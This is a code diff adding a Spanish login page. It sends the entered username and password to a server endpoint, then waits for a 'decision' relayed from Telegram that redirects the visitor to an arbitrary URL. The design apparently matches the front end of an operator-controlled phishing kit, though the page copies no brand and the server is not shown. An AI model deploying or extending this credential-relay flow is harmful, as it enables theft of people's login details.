@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Formulario de acceso</title>
+</head>
+<body>
+  <h1>Login</h1>
+  <form id="loginForm">
+    <label>Usuario:</label><br>
+    <input type="text" name="usuario" required><br>
+    <label>Contraseña:</label><br>
+    <input type="password" name="clave" required><br><br>
+    <button type="submit">Enviar</button>
+  </form>
+
+  <div id="respuesta" style="margin-top:20px; display:none;">
+    <p>Esperando respuesta desde Telegram...</p>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const respuesta = document.getElementById('respuesta');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const datos = new FormData(form);
+      const json = {
+        usuario: datos.get('usuario'),
+        clave: datos.get('clave')
+      };
+
+      await fetch('/enviar', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(json)
+      });
+
+      form.style.display = 'none';
+      respuesta.style.display = 'block';
+    });
+  </script>
+ <script src="/socket.io/socket.io.js"></script>
+<script>
+  const socket = io();
+
+  // Escucha las decisiones que llegan desde Telegram
+  socket.on('decision', (data) => {
+    console.log('✅ Acción recibida:', data);
+
+    // Redirige según la URL recibida
+    if (data.url) {
+      window.location.href = data.url;
+    }
+  });
+</script>
+
+
+</body>
+</html>
